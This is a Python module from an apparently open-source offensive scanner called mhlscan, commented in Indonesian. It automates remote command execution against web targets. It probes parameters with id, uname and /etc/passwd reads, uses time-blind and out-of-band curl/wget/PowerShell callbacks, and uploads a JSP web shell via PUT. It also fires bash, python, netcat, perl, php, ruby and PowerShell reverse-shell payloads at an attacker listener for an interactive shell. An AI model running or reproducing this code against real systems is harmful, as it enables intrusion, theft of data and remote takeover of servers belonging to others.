# GNU GPL License V3
# mhlscan by sigit-hdteamlabs

# -*- coding: utf-8 -*-
"""_rce.py - Payload Execution, Verification & Reverse Shell Engine.

Kemampuan:
1. verify_rce: echo, id, uname, /etc/passwd, time-blind, windows
2. OAST verify: untuk blind RCE yang tidak reflect output
3. Auto-detect parameter injection point dari HTML/JS
4. Deploy shell otomatis via _shell.py (JSP)
5. Reverse shell multi-payload (8 Linux + 3 Windows)
"""

import time
import socket
import threading
import requests
import urllib3
import sys
import re
import base64

import _windows_rce
import _shell

urllib3.disable_warnings()

GREEN = '\033[32m'
RED = '\033[91m'
YELLOW = '\033[1;33m'
BOLD = '\033[1m'
ENDC = '\033[0m'

_OAST_CLIENT = None


def set_oast_client(client):
    global _OAST_CLIENT
    _OAST_CLIENT = client


def get_local_ip():
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect(("8.8.8.8", 80))
        ip = s.getsockname()[0]
        s.close()
        return ip
    except Exception:
        return "127.0.0.1"


def _build_url(url, param, value):
    import urllib.parse
    sep = "&" if "?" in url else "?"
    return f"{url}{sep}{param}={urllib.parse.quote_plus(value)}"


def _measure_baseline(url, param):
    test_url = _build_url(url, param, "echo baseline")
    try:
        t0 = time.time()
        requests.get(test_url, timeout=10, verify=False)
        return time.time() - t0
    except Exception:
        return 0.0


# =========================================================
# AUTO-DETECT PARAMETER
# =========================================================
_PARAM_CANDIDATES = [
    "cmd", "exec", "command", "system", "shell", "ping", "query", "q",
    "c", "x", "do", "action", "run", "call", "user", "id", "file",
    "path", "dir", "url", "name", "val", "input", "data",
]

_COMMON_PARAM_NAMES = set(_PARAM_CANDIDATES) | {
    "p", "page", "view", "lang", "q", "s", "search", "term",
    "email", "username", "password", "user", "pass", "token",
    "redirect", "next", "return", "target", "site", "host",
}


def detect_params(url, timeout=5):
    """Deteksi nama parameter dari HTML/JS/form/URL target.

    Return list nama parameter yang terdeteksi (urut prioritas).
    """
    import requests
    from urllib.parse import urlparse, parse_qs

    candidates = set()

    # 1. Dari URL query
    try:
        qs = urlparse(url).query
        for k in parse_qs(qs).keys():
            candidates.add(k)
    except Exception:
        pass

    # 2. Dari HTML form + JS
    try:
        r = requests.get(url, timeout=timeout, verify=False)
        html = r.text or ""

        # name="..." atau name='...'
        for m in re.finditer(r'name=["\']([A-Za-z_][A-Za-z0-9_\-]{0,40})["\']',
                             html):
            candidates.add(m.group(1))

        # id="..." untuk JS biasanya
        for m in re.finditer(r'id=["\']([A-Za-z_][A-Za-z0-9_\-]{0,40})["\']',
                             html):
            candidates.add(m.group(1))

        # JS: ?param= atau &param=
        for m in re.finditer(r'[?&]([A-Za-z_][A-Za-z0-9_\-]{0,40})=', html):
            candidates.add(m.group(1))

        # JS: var param = "..." atau searchParams.get("param")
        for m in re.finditer(
            r'searchParams\.get\(["\']([A-Za-z_][A-Za-z0-9_\-]{0,40})["\']',
            html):
            candidates.add(m.group(1))
    except Exception:
        pass

    # Filter: buang parameter yang jelas bukan injection point
    filtered = [c for c in candidates if c.lower() in _COMMON_PARAM_NAMES
                or any(k in c.lower() for k in ("cmd", "exec", "run",
                                                "query", "input", "do",
                                                "file", "path", "url"))]

    # Prioritas
    def score(p):
        pl = p.lower()
        if pl in ("cmd", "exec", "command", "system", "shell"):
            return 0
        if pl in ("c", "x", "q", "run", "call", "do", "action"):
            return 1
        if pl in ("id", "query", "input", "data", "val"):
            return 2
        return 3

    return sorted(set(filtered), key=score)[:15]


# =========================================================
# FASE 1 — VERIFIKASI RCE (echo, id, uname, passwd, time, win)
# =========================================================
def payload_linux_id(url, param):
    r_url = _build_url(url, param, "id")
    try:
        r = requests.get(r_url, timeout=10, verify=False)
        m = re.search(r'uid=\d+\([^)]+\)\s+gid=\d+', r.text)
        if m:
            return {"success": True, "param": param, "method": "id_linux",
                    "os": "linux", "evidence": m.group(0)}
    except Exception:
        pass
    return None


def payload_linux_uname(url, param):
    r_url = _build_url(url, param, "uname -a")
    try:
        r = requests.get(r_url, timeout=10, verify=False)
        m = re.search(r'Linux\s+\S+\s+\d+\.\d+', r.text)
        if m:
            return {"success": True, "param": param, "method": "uname_linux",
                    "os": "linux", "evidence": m.group(0)}
    except Exception:
        pass
    return None


def payload_linux_passwd(url, param):
    r_url = _build_url(url, param, "head -1 /etc/passwd")
    try:
        r = requests.get(r_url, timeout=10, verify=False)
        m = re.search(r'root:[x*]?:0:0:', r.text)
        if m:
            return {"success": True, "param": param, "method": "passwd_linux",
                    "os": "linux", "evidence": "root:x:0:0 detected"}
    except Exception:
        pass
    return None


def payload_windows_ver(url, param):
    r_url = _build_url(url, param, "ver")
    try:
        r = requests.get(r_url, timeout=10, verify=False)
        if "Microsoft Windows [Version" in r.text:
            return {"success": True, "param": param, "method": "ver_windows",
                    "os": "windows", "evidence": "Microsoft Windows [Version"}
    except Exception:
        pass
    return None


def payload_windows_whoami(url, param):
    r_url = _build_url(url, param, "whoami")
    try:
        r = requests.get(r_url, timeout=10, verify=False)
        m = re.search(r'([A-Za-z0-9_\-]+)\\([A-Za-z0-9_\-$]+)', r.text)
        if m:
            return {"success": True, "param": param, "method": "whoami_windows",
                    "os": "windows", "evidence": f"{m.group(1)}\\{m.group(2)}"}
    except Exception:
        pass
    return None


def payload_windows_delay(url, param, timeout=15, sleep_sec=5):
    r_url = _build_url(url, param, f"timeout /t {sleep_sec} /nobreak")
    start = time.time()
    try:
        requests.get(r_url, timeout=timeout, verify=False)
        elapsed = time.time() - start
        if elapsed >= (sleep_sec * 0.8):
            return {"success": True, "param": param,
                    "method": "windows_timeout_delay", "os": "windows",
                    "evidence": f"Delay {elapsed:.1f}s"}
    except requests.exceptions.Timeout:
        return {"success": True, "param": param,
                "method": "windows_timeout_delay", "os": "windows",
                "evidence": f"Timeout (timeout /t {sleep_sec})"}
    except Exception:
        pass
    return None


def payload_time_blind_linux(url, param, sleep_sec=5):
    baseline = _measure_baseline(url, param)
    r_url = _build_url(url, param, f"sleep {sleep_sec}")
    start = time.time()
    try:
        requests.get(r_url, timeout=sleep_sec + 10, verify=False)
        elapsed = time.time() - start
        if elapsed >= baseline + (sleep_sec * 0.8):
            return {"success": True, "param": param, "method": "time_blind",
                    "os": "linux", "evidence": f"Delay {elapsed:.1f}s"}
    except requests.exceptions.Timeout:
        return {"success": True, "param": param, "method": "time_blind",
                "os": "linux", "evidence": "Timeout"}
    except Exception:
        pass
    return None


def payload_echo(url, param):
    token = "RCE_" + str(int(time.time()))
    r_url = _build_url(url, param, f"echo {token}")
    try:
        r = requests.get(r_url, timeout=10, verify=False)
        if token in r.text:
            return {"success": True, "param": param, "method": "echo",
                    "os": "unknown", "evidence": f"Token '{token}' found"}
    except Exception:
        pass
    return None


# =========================================================
# FASE 2 — OAST VERIFY (blind RCE)
# =========================================================
def payload_oast_linux(url, param):
    """Kirim curl/wget ke OAST. Kalau OAST server terima hit, RCE confirmed."""
    if not _OAST_CLIENT:
        return None
    try:
        oast_url = getattr(_OAST_CLIENT, "url", None)
        if not oast_url:
            return None
        token = "oast" + str(int(time.time()))
        cb_url = f"{oast_url}/{token}"

        payloads = [
            f"curl -s {cb_url}",
            f"wget -q -O- {cb_url}",
            f"curl -s -o /dev/null {cb_url}",
        ]
        for p in payloads:
            r_url = _build_url(url, param, p)
            try:
                requests.get(r_url, timeout=8, verify=False)
            except Exception:
                pass
            time.sleep(2)
            try:
                hits = _OAST_CLIENT.poll()
                if hits:
                    return {"success": True, "param": param,
                            "method": "oast_linux", "os": "linux",
                            "evidence": f"OAST hit: {token}"}
            except Exception:
                pass
    except Exception:
        pass
    return None


def payload_oast_windows(url, param):
    """Windows OAST: PowerShell Invoke-WebRequest / curl.exe."""
    if not _OAST_CLIENT:
        return None
    try:
        oast_url = getattr(_OAST_CLIENT, "url", None)
        if not oast_url:
            return None
        token = "oast" + str(int(time.time()))
        cb_url = f"{oast_url}/{token}"

        payloads = [
            f'powershell -c "Invoke-WebRequest -Uri {cb_url} -UseBasicParsing"',
            f"curl.exe -s {cb_url}",
        ]
        for p in payloads:
            r_url = _build_url(url, param, p)
            try:
                requests.get(r_url, timeout=8, verify=False)
            except Exception:
                pass
            time.sleep(2)
            try:
                hits = _OAST_CLIENT.poll()
                if hits:
                    return {"success": True, "param": param,
                            "method": "oast_windows", "os": "windows",
                            "evidence": f"OAST hit: {token}"}
            except Exception:
                pass
    except Exception:
        pass
    return None


def payload_oast(url, param):
    """Coba OAST Linux dulu, lalu Windows."""
    r = payload_oast_linux(url, param)
    if r:
        return r
    return payload_oast_windows(url, param)


# =========================================================
# FASE 3 — DEPLOY SHELL (JSP via _shell.py)
# =========================================================
def deploy_jsp_shell(url, vuln_path, param_used="cmd"):
    """Deploy JSP shell ke target jika ada file write primitive.

    Return dict {shell_url, param, evidence} atau None.

    CATATAN: Ini hanya dipanggil kalau RCE verified lewat CVE file-upload
    (CVE-2024-5084, CVE-2022-29464, CVE-2025-24813, dll).
    """
    try:
        payload_jsp, shell_param, title = _shell.make_random_shell()
        # Nama file random
        import random
        shell_name = "mhl" + str(random.randint(100000, 999999))
        shell_file = f"/{shell_name}.jsp"
        # Upload payload
        try:
            r = requests.put(url.rstrip('/') + shell_file,
                             data=payload_jsp.encode(),
                             timeout=10, verify=False,
                             headers={"Content-Type": "application/octet-stream"})
            if r.status_code not in (200, 201, 204):
                return None
        except Exception:
            return None
        # Verify shell works
        time.sleep(2)
        try:
            test = requests.get(url.rstrip('/') + shell_file,
                                params={shell_param: "echo MHL_SHELL_OK"},
                                timeout=10, verify=False)
            if "MHL_SHELL_OK" in test.text:
                return {
                    "shell_url": url.rstrip('/') + shell_file,
                    "param": shell_param,
                    "evidence": f"Shell deployed at {shell_file}",
                }
        except Exception:
            pass
        return None
    except Exception:
        return None


# =========================================================
# verify_rce — entry point utama
# =========================================================
def verify_rce(url, param="cmd", os_type="auto", detect_auto=True):
    """Verifikasi RCE. Return dict {success, param, method, os, evidence}.

    Kalau param="auto" atau detect_auto=True, akan coba auto-detect parameter.
    """
    print(f"    [*] Memvalidasi RCE di {url} (OS: {os_type})...")

    # Auto-detect parameter
    test_params = []
    if param and param != "auto":
        test_params.append(param)
    if detect_auto or not test_params:
        auto_params = detect_params(url)
        test_params.extend(auto_params)

    # Fallback
    fallback = ["cmd", "exec", "x", "c", "system", "command",
                "ping", "query", "q", "0", "id"]
    for p in fallback:
        if p not in test_params:
            test_params.append(p)

    test_params = test_params[:12]

    # Linux
    if os_type in ("linux", "auto", "unknown"):
        for p in test_params:
            r = payload_linux_id(url, p)
            if r: return r
        for p in test_params:
            r = payload_linux_uname(url, p)
            if r: return r
        for p in test_params:
            r = payload_linux_passwd(url, p)
            if r: return r
        for p in test_params:
            r = payload_time_blind_linux(url, p)
            if r: return r
        # OAST (kalau ada client)
        for p in test_params[:5]:
            r = payload_oast(url, p)
            if r: return r

    # Windows
    if os_type in ("windows", "auto"):
        for p in test_params:
            r = payload_windows_ver(url, p)
            if r: return r
        for p in test_params:
            r = payload_windows_whoami(url, p)
            if r: return r
        for p in test_params:
            r = payload_windows_delay(url, p)
            if r: return r
        for p in test_params[:5]:
            r = payload_oast(url, p)
            if r: return r

    # Echo fallback
    for p in test_params:
        r = payload_echo(url, p)
        if r: return r

    return {"success": False}


# =========================================================
# FASE 4 — REVERSE SHELL
# =========================================================
def _build_payloads(lhost, lport, os_type):
    payloads = []

    if os_type in ("linux", "auto", "unknown"):
        payloads.extend([
            f"bash -c 'bash -i >& /dev/tcp/{lhost}/{lport} 0>&1'",
            (f"python3 -c 'import socket,subprocess,os;"
             f"s=socket.socket();s.connect((\"{lhost}\",{lport}));"
             f"os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);"
             f"os.dup2(s.fileno(),2);subprocess.call([\"/bin/sh\",\"-i\"])'"),
            (f"python -c 'import socket,subprocess,os;"
             f"s=socket.socket();s.connect((\"{lhost}\",{lport}));"
             f"os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);"
             f"os.dup2(s.fileno(),2);subprocess.call([\"/bin/sh\",\"-i\"])'"),
            f"rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc {lhost} {lport} >/tmp/f",
            f"nc -e /bin/sh {lhost} {lport}",
            (f"perl -e 'use Socket;$i=\"{lhost}\";$p={lport};"
             f"socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));"
             f"if(connect(S,sockaddr_in($p,inet_aton($i)))){{"
             f"open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");"
             f"exec(\"/bin/sh -i\");}};'"),
            (f"php -r '$sock=fsockopen(\"{lhost}\",{lport});"
             f"exec(\"/bin/sh -i <&3 >&3 2>&3\");'"),
            (f"ruby -rsocket -e 'exit if fork;"
             f"c=TCPSocket.new(\"{lhost}\",{lport});"
             f"while(cmd=c.gets);IO.popen(cmd,\"r\"){{|io|c.print io.read}}end'"),
        ])

    if os_type in ("windows", "auto"):
        try:
            payloads.append(_windows_rce.powershell_reverse_shell(lhost, lport))
            payloads.append(_windows_rce.powershell_reverse_shell_raw(lhost, lport))
            payloads.append(_windows_rce.powershell_bind_shell(lport))
        except Exception:
            pass

    return payloads


def listener_thread(port, ready_event, conn_event, os_type="linux"):
    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    try:
        server.bind(("0.0.0.0", port))
        server.listen(1)
        ready_event.set()
    except Exception as e:
        print(f"\n[-] Listener bind error: {e}")
        ready_event.set()
        return

    conn = None
    try:
        server.settimeout(30)
        conn, addr = server.accept()
        conn_event.set()
        print(f"\n\n{GREEN}{BOLD}[+] KONEKSI BALIK DARI {addr[0]}:{addr[1]}!{ENDC}")
        print("[*] Ketik 'exit' untuk keluar.\n")

        while True:
            try:
                cmd = input(f"{BOLD}rev-shell > {ENDC}")
                if cmd.lower().strip() in ("exit", "quit", "keluar"):
                    break
                if not cmd.strip():
                    continue
                terminator = "\r\n" if os_type == "windows" else "\n"
                conn.sendall((cmd + terminator).encode())

                conn.settimeout(0.5)
                output = b""
                while True:
                    try:
                        data = conn.recv(4096)
                        if not data:
                            break
                        output += data
                    except socket.timeout:
                        break
                print(output.decode('utf-8', errors='ignore').strip())

            except KeyboardInterrupt:
                print("\n[!] Gunakan 'exit'.")
            except Exception as e:
                print(f"[-] {e}")
                break
    except socket.timeout:
        print(f"\n{YELLOW}[!] Listener timeout 30s.{ENDC}")
    except Exception as e:
        print(f"\n[-] Listener error: {e}")
    finally:
        if conn:
            try: conn.close()
            except Exception: pass
        server.close()


def trigger_reverse_shell(url, param, lhost, lport, os_type="auto",
                          conn_event=None):
    print(f"    [*] Reverse shell {lhost}:{lport} (OS: {os_type})...")
    payloads = _build_payloads(lhost, lport, os_type)
    if not payloads:
        return False

    for i, payload in enumerate(payloads, 1):
        print(f"    [*] Payload {i}/{len(payloads)}: {payload[:60]}...")
        test_url = _build_url(url, param, payload)

        sent_ok = False
        try:
            requests.get(test_url, timeout=5, verify=False)
            sent_ok = True
        except requests.exceptions.Timeout:
            sent_ok = True
        except Exception:
            continue

        if sent_ok and conn_event is not None:
            if conn_event.wait(timeout=10):
                return True
        time.sleep(1)

    return False


def launch_reverse_shell(url, param, lport=4444, lhost=None, os_type="auto"):
    if not lhost:
        lhost = get_local_ip()

    ready = threading.Event()
    conn_evt = threading.Event()
    t = threading.Thread(target=listener_thread,
                         args=(lport, ready, conn_evt, os_type),
                         daemon=True)
    t.start()
    if not ready.wait(timeout=10):
        print(f"{RED}[!] Listener tidak siap dalam 10s.{ENDC}")
        return False

    if trigger_reverse_shell(url, param, lhost, lport,
                             os_type=os_type, conn_event=conn_evt):
        t.join()
        return True
    return False

# =========================================================
# TAMBAHAN: SHELLCODE-BASED RCE (dari _payload_gen)
# =========================================================
def payload_shellcode_raw(url, param, lhost, lport, platform="linux"):
    """Kirim shellcode raw via HTTP (base64-encoded di URL).

    Hanya jalan kalau target punya primitive yang menerima base64
    dan men-decode + eksekusi (jarang, tapi untuk kasus seperti
    eval(base64_decode($_GET[x]))).
    """
    try:
        import _payload_gen
    except ImportError:
        return None

    gen = _payload_gen.generate_reverse_shell(
        lhost, lport, platform=platform, fmt="raw")
    if not gen.get("success"):
        return None

    payload = gen["payload"]
    if isinstance(payload, bytes):
        payload = base64.b64encode(payload).decode()
    else:
        payload = base64.b64encode(payload.encode("latin-1", "ignore")).decode()

    try:
        test_url = _build_url(url, param, payload)
        requests.get(test_url, timeout=5, verify=False)
        return {"success": True, "param": param,
                "method": "shellcode_raw", "os": platform,
                "evidence": f"Shellcode sent ({len(payload)} chars b64)"}
    except Exception:
        pass
    return None


def payload_gen_helper(payload_name, lhost=None, lport=None, cmd=None,
                       encoder=None, fmt="raw"):
    """Helper: generate payload via _payload_gen."""
    try:
        import _payload_gen
        return _payload_gen.generate(payload_name, lhost=lhost, lport=lport,
                                     cmd=cmd, encoder=encoder, fmt=fmt)
    except Exception as e:
        return {"success": False, "error": str(e)}